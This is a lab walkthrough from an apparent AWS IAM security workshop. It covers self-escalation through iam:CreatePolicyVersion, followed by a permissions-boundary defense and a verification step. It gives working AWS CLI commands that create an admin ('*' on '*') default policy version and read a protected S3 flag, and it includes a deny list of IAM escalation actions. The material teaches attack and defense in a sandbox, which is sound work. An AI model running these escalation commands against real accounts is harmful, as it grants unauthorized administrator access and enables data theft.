## Scenario 1: CreatePolicyVersion — Self-Escalation via Policy Version Manipulation

**Category:** Self-Escalation
**Starting Identity:** `iamws-policy-developer-user`
**Target:** Crown jewels in `s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt`

**The Vulnerability:** `iamws-policy-developer-user` can create new versions of IAM policies — including `iamws-developer-tools-policy`, which is attached to their own user. By creating a new version with administrator permissions and setting it as default, they grant themselves full access without touching any other principal or resource.

**Real-world scenario:** A developer is given permission to manage "development" policies for their team. Without proper constraints, they can modify ANY policy — including ones attached to their own user — effectively granting themselves any permission they want.

### Part A: Identify with iam-recon

Build or refresh your iam-recon graph:

```bash
iam-recon graph create --profile taractf
```

Run the pathfinding scan — this is the correct recon surface for this scenario:

```bash
iam-recon --account $ACCOUNT_ID pathfinding
```

Look for the `[iam-001] user/iamws-policy-developer-user` entry:
```
[iam-001] user/iamws-policy-developer-user (self-escalation)
    Path: iam:CreatePolicyVersion
    Perms: iam:CreatePolicyVersion
    https://www.pathfinding.cloud/paths/iam-001
```

Confirm the specific permission directly:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-policy-developer-user \
  --action iam:CreatePolicyVersion
```

Expected output:
```
ALLOW user/iamws-policy-developer-user can call iam:CreatePolicyVersion with *
```

**In the interactive visualization:** launch `iam-recon --account $ACCOUNT_ID visualize --interactive-viz` (port is dynamic — watch for `Interactive visualization available at: http://127.0.0.1:<port>` in the terminal). The user node is blue (no privesc edge exists for this attack family), but clicking it shows the pathfinding annotations. The viz color alone doesn't tell the full story.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/iam-001](https://pathfinding.cloud/paths/iam-001):

- **Category:** Self-Escalation
- **Required permission:** `iam:CreatePolicyVersion`
- **Attack:** Create a new policy version with admin permissions and set it as default
- **Impact:** Immediate full account access

**Key insight:** The vulnerability isn't about which policies are being managed — it's about modifying a policy that grants YOUR OWN permissions. Even if the Resource is scoped, as long as the user can modify policies attached to themselves, they can escalate.

### Part C: Exploit the Vulnerability

**Step 1: Confirm your low-privilege identity**

```bash
aws sts get-caller-identity --profile iamws-policy-developer-user
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "767397689800",
    "Arn": "arn:aws:iam::767397689800:user/iamws-policy-developer-user"
}
```

**Step 2: Try the crown jewels — you're denied**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-policy-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 3: Inspect the policy attached to this user**

```bash
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

aws iam get-policy-version \
  --policy-arn $POLICY_ARN --version-id v1 \
  --query 'PolicyVersion.Document' --output json \
  --profile iamws-policy-developer-user
```

The policy grants EC2 read-only access — limited. But notice it's attached to your own user, which means you can modify it.

**Step 4: Create an admin version and set it as default**

```bash
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default \
  --profile iamws-policy-developer-user
```

No error — the user is allowed to create new policy versions, including ones that grant `*:*`.

**Step 5: Claim the crown jewels**

> [!NOTE]
> IAM policy changes are eventually consistent — the new version can take 5–15 seconds to propagate. If the command below returns 403, wait and retry.

```bash
sleep 15
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

The file contents appear — you escalated from developer to `AdministratorAccess` by modifying your own policy.

### Part D: Apply the Defense

Run all defense steps as your admin identity.

**Step 0: Reset the attack artifact — restore the original policy version**

The boundary blocks new `CreatePolicyVersion` calls, but the v2 admin policy from the attack is still default. Reset to v1 before applying the boundary, or the defense appears to fail (the boundary's `AllowDeveloperActions` permits `s3:*`, so crown jewels reads still succeed through the escalated policy):

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

aws iam set-default-policy-version --policy-arn $POLICY_ARN --version-id v1
aws iam delete-policy-version --policy-arn $POLICY_ARN --version-id v2
```

**Step 1: Write the boundary policy**

```bash
cat > /tmp/boundary-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowDeveloperActions",
      "Effect": "Allow",
      "Action": ["s3:*","ec2:Describe*","lambda:List*","lambda:Get*","logs:*","cloudwatch:*"],
      "Resource": "*"
    },
    {
      "Sid": "AllowLimitedIAMRead",
      "Effect": "Allow",
      "Action": ["iam:Get*","iam:List*"],
      "Resource": "*"
    },
    {
      "Sid": "DenyPrivilegeEscalation",
      "Effect": "Deny",
      "Action": [
        "iam:CreatePolicyVersion","iam:SetDefaultPolicyVersion",
        "iam:AttachUserPolicy","iam:AttachRolePolicy",
        "iam:PutUserPolicy","iam:PutRolePolicy",
        "iam:CreateUser","iam:CreateRole","iam:CreateAccessKey",
        "iam:UpdateAssumeRolePolicy",
        "iam:DeleteUserPermissionsBoundary","iam:DeleteRolePermissionsBoundary"
      ],
      "Resource": "*"
    }
  ]
}
EOF
```

**Step 2: Create the boundary policy in IAM**

```bash
aws iam create-policy \
  --policy-name DeveloperBoundary \
  --policy-document file:///tmp/boundary-policy.json \
  --description "Permissions boundary that prevents privilege escalation"
```

**Step 3: Apply the boundary to the user and the role**

```bash
aws iam put-user-permissions-boundary \
  --user-name iamws-policy-developer-user \
  --permissions-boundary arn:aws:iam::${ACCOUNT_ID}:policy/DeveloperBoundary

aws iam put-role-permissions-boundary \
  --role-name iamws-policy-developer-role \
  --permissions-boundary arn:aws:iam::${ACCOUNT_ID}:policy/DeveloperBoundary
```

What this boundary does:
1. **Ceiling, not fence:** effective permissions = identity policy ∩ boundary. Even if the user creates a `*:*` policy version, the boundary caps what they can actually do.
1. **Explicit Deny on escalation actions:** `DenyPrivilegeEscalation` blocks the specific IAM mutations that enable self-escalation.
1. **Self-protection:** `iam:DeleteUserPermissionsBoundary` is in the deny list — the user can't remove the boundary itself.

### Part E: Verify the Remediation

**Step 1: Re-run the exploit as the attacker — confirm it's blocked**

```bash
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default \
  --profile iamws-policy-developer-user
```

Expected output:
```
An error occurred (AccessDenied) when calling the CreatePolicyVersion operation:
User: arn:aws:iam::767397689800:user/iamws-policy-developer-user
is not authorized to perform: iam:CreatePolicyVersion on resource:
policy arn:aws:iam::767397689800:policy/iamws-developer-tools-policy
with an explicit deny in a permissions boundary: arn:aws:iam::767397689800:policy/DeveloperBoundary
```

**Step 2: Confirm the crown jewels are still safe**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 3: Verify with AWS simulate-principal-policy**

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::${ACCOUNT_ID}:user/iamws-policy-developer-user \
  --action-names iam:CreatePolicyVersion \
  --query 'EvaluationResults[0].EvalDecision' \
  --profile taractf
```

Expected output:
```
"explicitDeny"
```

The boundary is correctly denying the escalation action.

> [!NOTE]
> `iam-recon argquery --principal ... --action iam:CreatePolicyVersion` and `pathfinding [iam-001]` will still return ALLOW / still show the finding after the defense is applied. iam-recon collects permissions boundaries into its cached graph but does not apply them during query evaluation (verified 2026-05-12). AWS `simulate-principal-policy` is the correct verification surface for boundary-based defenses.

### What You Learned

- `iam:CreatePolicyVersion` allows modifying any policy — including ones attached to your own user. This is the root cause of self-escalation.
- A **permissions boundary** caps effective permissions at the intersection of the identity policy and the boundary, regardless of what the identity policy grants.
- `Deny` in a boundary overrides any `Allow` in the identity policy — even a `*:*` identity policy is constrained by the boundary.
- Always deny `iam:DeleteUserPermissionsBoundary` (and the role variant) in the boundary itself, or the control is self-removing.
- iam-recon does not evaluate boundaries in `argquery` or `pathfinding` — use AWS `simulate-principal-policy` to verify boundary-based defenses.

### Cleanup

See [`cleanup.md`](cleanup.md) for revert steps before moving to the next scenario.

---

**Next:** [Scenario 2: Trust Policy `:root`](../scenario-2-trust-policy-root/instructions.md) — Privilege escalation via permissive role trust
